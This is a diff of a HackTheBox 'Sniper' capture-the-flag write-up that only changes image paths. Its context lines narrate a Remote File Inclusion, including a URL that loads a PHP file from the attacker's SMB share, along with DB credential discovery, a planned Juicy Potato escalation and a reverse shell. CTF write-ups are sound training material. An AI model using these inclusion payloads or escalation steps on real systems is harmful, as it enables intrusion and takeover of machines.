@@ -91,12 +91,12 @@
 - There's a login page, but I don't find any vulnerabilities in it, there's also the functionality of creating a user. I do so, and login into the website.
 
 - A possible **File Inclusion** is what immediately comes to mind:
-	![](../../assets/FI_Sniper.png)
+	![](./FI_Sniper.png)
 
 - Since this is a Windows machine, I tried a **Remote File Inclusion** using **SMB** and it worked!
     - http://sniper.htb/blog/?lang=\\10.10.14.25\share\teste.php
 
-    ![](../../assets/RFI_Test_Sniper.png)
+    ![](./RFI_Test_Sniper.png)
 
 ### ===== Exploitation =====
 
@@ -107,15 +107,15 @@
 - While browsing around, I found some interesting things:
 
 - whoami:
-    ![](../../assets/whoami_Sniper.png)
+    ![](./whoami_Sniper.png)
 
 - DB credentials:
-    ![](../../assets/db_Sniper.png)
+    ![](./db_Sniper.png)
 - I have SeImpersonatePrivilege, so I immediately think I will be able to use **Juicy Potato** to escalate my privileges
-    ![](../../assets/privs_Sniper.png)
+    ![](./privs_Sniper.png)
 
 - I will start a **reverse shell** (base64 command from https://www.revshells.com/)
-    ![](../../assets/rev_shell_Sniper.png)
+    ![](./rev_shell_Sniper.png)
 
 ### ===== Privilege Escalation =====
 
@@ -163,7 +163,7 @@
     ```
 
 - I sent the PDF to my SMB server, but I didn't find anything useful in it
-    ![](../../assets/pdf_Sniper.png)
+    ![](./pdf_Sniper.png)
 
 - The SMB shares that Chris has access to have nothing useful also
 	```
